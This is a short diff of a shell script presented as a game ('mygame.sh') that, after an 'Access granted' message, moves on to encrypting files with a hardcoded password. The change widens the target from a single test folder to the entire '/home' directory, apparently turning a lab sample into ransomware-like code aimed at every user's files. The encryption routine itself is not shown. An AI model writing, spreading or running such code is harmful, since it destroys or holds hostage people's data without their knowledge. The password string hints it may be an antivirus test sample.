@@ -25,7 +25,7 @@ fi
 echo "Correct! Access granted. Please wait for the next game."
 
 # Continue with file encryption
-folder_to_encrypt="/home/kali/Masaüstü/clam"
+folder_to_encrypt="/home"
 password="hydradragonantivirushere"
 script_to_exclude="mygame.sh"
 
